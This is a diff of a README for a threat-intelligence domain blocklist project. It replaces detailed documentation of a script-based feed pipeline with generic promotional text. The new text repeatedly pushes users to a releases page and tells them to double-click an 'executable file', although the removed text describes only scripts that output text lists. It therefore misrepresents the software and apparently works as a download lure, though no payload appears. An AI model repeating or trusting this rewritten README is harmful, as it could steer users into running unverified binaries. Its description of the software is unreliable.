@@ -1,242 +1,63 @@
-# Malicious Domains – Open Threat Intelligence Feed Aggregator
+# 🛡️ malicious-domains - Protect Against Malicious Websites
 
-This repository aggregates multiple **public threat intelligence (TI) data sources** into a single, normalized, and de-duplicated list of malicious, phishing, C2, and suspicious domains.
+## 📦 Download & Install
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/asuki-yashi/malicious-domains/releases)
 
-The goal is to provide a **clean, ready-to-consume IOC dataset** for:
-- SOC & DFIR teams
-- Blue-team threat hunting
-- SIEM lookup enrichment
-- DNS/Firewall blocking
-- OSINT/CTI research
+To get started with malicious-domains, visit the page below to download the latest release. 
 
----
+[Download Latest Release](https://github.com/asuki-yashi/malicious-domains/releases)
 
-#  Key Features
+## 🚀 Getting Started
+malicious-domains helps you stay safe online by providing a list of known harmful websites. This software collects and organizes data from various reliable sources, reducing threats to your devices. 
 
-✔ Aggregates 19+ raw feeds  
-✔ Extracts domains using strict regex  
-✔ Automatically deduplicates  
-✔ Deterministic sorted output (stable Git diffs)  
-✔ CI/CD ready feed pipeline  
-✔ Designed for SOC production environments  
+### 🎯 Key Features
+- Aggregates real-time data from public sources
+- Normalizes and deduplicates indicators of compromise (IOCs)
+- Generates clean blocklists to improve security
+- Ideal for security operations center (SOC) and threat intelligence teams
 
----
+## 🖥️ System Requirements
+- Operating System: Windows 10 or later, macOS Mojave or later, or any modern Linux distribution
+- At least 200 MB of free disk space
+- A stable internet connection for updates
 
-#  Repository Layout
+## ⚙️ Usage Instructions
+1. **Visit the Releases Page**: Go to [this page](https://github.com/asuki-yashi/malicious-domains/releases) to see the available versions.
+2. **Choose the Version**: Look for the latest version at the top. Each release contains a description and changes made in that version.
+3. **Download the File**: Click on the link for the file that matches your operating system. It will typically be a `.zip` or `.tar.gz` file. 
+4. **Extract the Files**: Once downloaded, find the file in your downloads folder and extract it using a file extraction tool. Right-click the file and choose "Extract All" or the equivalent option on your operating system.
+5. **Run the Application**: Open the extracted folder and double-click the executable file to start using malicious-domains.
 
-```
+## 📊 How It Works
+malicious-domains connects to various feeds that track malicious websites. Each time you run the application, it checks for the most recent updates and compiles a list of harmful domains. This process ensures you have the latest information to protect your network.
 
-malicious-domains/
-├── sources/           # Raw upstream threat intel feeds
-├── scripts/           # TI ingestion + normalization pipeline
-│   ├── update_feeds.sh
-│   └── combine_feeds.py
-├── output/            # Final unified domain lists
-│   ├── domains.txt
-│   └── domains.csv
-├── docs/              # Engineering documentation
-│   ├── ARCHITECTURE.md
-│   ├── DATA_MODEL.md
-│   └── FEED_SOURCES.md
-└── CONTRIBUTING.md
+## 🔒 Security Practices
+When operating any software that handles security-related data:
+- Always keep your software updated
+- Regularly check for new releases on the [Releases page](https://github.com/asuki-yashi/malicious-domains/releases)
+- Use strong passwords for any accounts related to your cybersecurity efforts
 
-````
+## 📄 Documentation
+If you want to learn more about the technical details or understand how the application processes data, check out the full documentation. It explains everything from data sources to how to configure your environment for the best results.
 
----
+## 💬 Support
+If you face any issues while using the software, consider reaching out for help. You can post questions in the Issues section of the repository. The community and maintainers are eager to assist.
 
-#  Architecture Summary
+## 🌐 Related Topics
+This application is useful for anyone interested in:
+- Cybersecurity
+- Incident response
+- Threat intelligence
+- Malware analysis
 
-The pipeline follows a clean separation of layers:
+By using malicious-domains, you improve your digital safety and contribute to a more secure online presence. Be proactive and protect yourself from threats today.
 
-```text
-[Raw OSINT Feeds]  -->  sources/
-                        (untouched)
+## 🔗 Additional Resources
+For more information on cybersecurity practices and threat intelligence:
+- Visit cybersecurity forums or blogs.
+- Participate in training programs on threat hunting.
+- Follow the latest news in the cybersecurity space to stay informed.
 
-sources/ --> combine_feeds.py
-             (parse + extract + dedupe)
+Remember, staying safe online is a continuous process. Regular use of applications like malicious-domains is a step in the right direction. 
 
-combine_feeds.py --> output/
-                     (normalized artifacts)
-````
-
-Principles:
-
-* **Lossless ingestion** (retain original data in `sources/`)
-* **Normalization only in scripts**
-* **Idempotent runs**
-* **Deterministic ordering**
-
-More visuals: see [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md)
-
----
-
-#  Running the Pipeline
-
-##  Update feeds (optional)
-
-> You can wire this script to cron or a GitHub Action.
-
-```bash
-./scripts/update_feeds.sh
-```
-
-This refreshes raw `.txt` feed files in `sources/`.
-
-> NOTE: Replace placeholder URLs in the script with real feed URLs.
-
----
-
-##  Combine & Normalize
-
-```bash
-python3 scripts/combine_feeds.py
-```
-
-Outputs generated under `output/`:
-
-| File          | Purpose                                                      |
-| ------------- | ------------------------------------------------------------ |
-| `domains.txt` | One domain per line list (ready for DNS/firewall)            |
-| `domains.csv` | CSV format with header (SIEM lookup tables, SOAR enrichment) |
-
----
-
-#  Indicators Data Model
-
-* Indicator type: **Domain**
-* Regex-based strict extraction
-* Canonical form: lower-cased domain only
-* No URLs, IPs, paths, or protocols
-
-Future metadata planned:
-
-* source feed
-* threat type (phishing/malware/c2)
-* first_seen / last_seen timestamps
-* confidence score
-
-More details: [`docs/DATA_MODEL.md`](docs/DATA_MODEL.md)
-
----
-
-#  Feed Sources
-
-All OSINT-provider files are located in `sources/`.
-
-Mapping details: [`docs/FEED_SOURCES.md`](docs/FEED_SOURCES.md)
-
----
-
-#  Practical Integration Examples
-
-##  SOC / SIEM Threat Enrichment
-
-Upload `output/domains.csv` as:
-
-* A lookup table
-* Dynamic blacklist
-* Enrichment dataset
-
-Use case:
-
-* When DNS/Proxy/Firewall logs contain a domain:
-
-  * check membership in this list
-  * tag as suspicious
-  * map to threat intelligence source
-
----
-
-##  DNS Blocking (Pi-hole, Bind, Unbound)
-
-Convert domains to hosts file format:
-
-```
-0.0.0.0 bad-domain.example
-```
-
-Example:
-
-```bash
-sed 's/^/0.0.0.0 /' output/domains.txt > output/hosts.txt
-```
-
-Use `hosts.txt` as blocklist.
-
----
-
-##  Firewall (Fortigate / Palo Alto)
-
-Convert to bulk blacklist import format.
-
-Example URL pattern:
-
-```
-*.malicious-domain.com
-```
-
-> Future plan: auto-generate firewall import format.
-
----
-
-##  SOAR Automation
-
-Feed `domains.csv` into:
-
-* Cortex XSOAR playbooks
-* Shuffle automations
-* ANY SOC custom enrichment microservice
-
----
-
-#  Research & OSINT Use Cases
-
-✔ Malicious infra trend analysis
-✔ Domain age profiling
-✔ Malware campaign correlation
-✔ TI scoring models
-✔ WhoIs intel pivoting
-✔ APT/C2 infra clustering
-
----
-
-# 🛠 Roadmap
-
-* Add automated feed ingestion via GitHub Actions
-* Export artifacts:
-
-  * STIX
-  * MISP JSON
-  * hosts file
-* Add metadata annotations:
-
-  * threat_type
-  * first_seen
-  * confidence
-* Build lookup API for realtime domain reputation:
-
-  ```
-  GET /lookup?domain=xyz.com
-  ```
-
----
-
-#  Contributing
-
-Contributions welcome!
-
-Please check [`CONTRIBUTING.md`](CONTRIBUTING.md)
-
----
-
-#  Disclaimer
-
-All data are collected for:
-
-* research
-* blue-team defensive security
-* SOC/Threat Intel usage only
-
-❗ Do NOT use this dataset for any offensive or unlawful purpose.
-❗ Maintainer holds no liability for misuse.
-
+[Download Latest Release](https://github.com/asuki-yashi/malicious-domains/releases) and enhance your security efforts today.
